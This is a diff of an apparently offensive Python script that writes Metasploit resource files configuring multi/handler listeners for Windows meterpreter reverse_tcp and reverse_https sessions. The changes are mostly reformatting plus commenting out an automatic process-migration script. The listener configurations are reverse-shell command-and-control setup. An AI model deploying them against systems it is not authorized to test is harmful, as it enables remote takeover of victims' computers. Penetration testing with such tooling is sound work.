@@ -12,7 +12,8 @@ def build(lhost,lport):
 #====================================================
   listenerFileName="{0}/{1}".format(listenerPath,"500-reverse_tcp_noenc.rc")
   options = "use multi/handler\n"
-  options += "set payload windows/meterpreter/reverse_tcp\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+  options += "set payload windows/meterpreter/reverse_tcp\n"
+  options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
   options += "set ExitOnSession false\n"
   options += "set EnableStageEncoding false\n"
   options += "exploit -j\n"
@@ -33,10 +34,11 @@ def build(lhost,lport):
 
   listenerFileName="{0}/{1}".format(listenerPath,"501-reversehttps.rc")
   options = "use multi/handler\n"
-  options += "set payload windows/meterpreter/reverse_https\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+  options += "set payload windows/meterpreter/reverse_https\n"
+  options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
   options += "set ExitOnSession false\n"
   options += "set EnableStageEncoding false\n"
-  options += "set AutoRunScript post/windows/manage/smart_migrate\n"
+  #options += "set AutoRunScript post/windows/manage/smart_migrate\n"
   options += "exploit -j\n"
   if not os.path.exists(os.path.dirname(listenerFileName)):
     try:
@@ -51,7 +53,8 @@ def build(lhost,lport):
 #====================================================
   listenerFileName="{0}/{1}".format(listenerPath,"502-reverse_tcp.rc")
   options = "use multi/handler\n"
-  options += "set payload windows/meterpreter/reverse_tcp\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+  options += "set payload windows/meterpreter/reverse_tcp\n"
+  options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
   options += "set ExitOnSession false\n"
   options += "set EnableStageEncoding true\n"
   options += "exploit -j\n"
@@ -64,10 +67,6 @@ def build(lhost,lport):
   with open(listenerFileName, "w") as f:
     f.write(options)
     f.close()
-
-
-
-
 
 
 #grab args
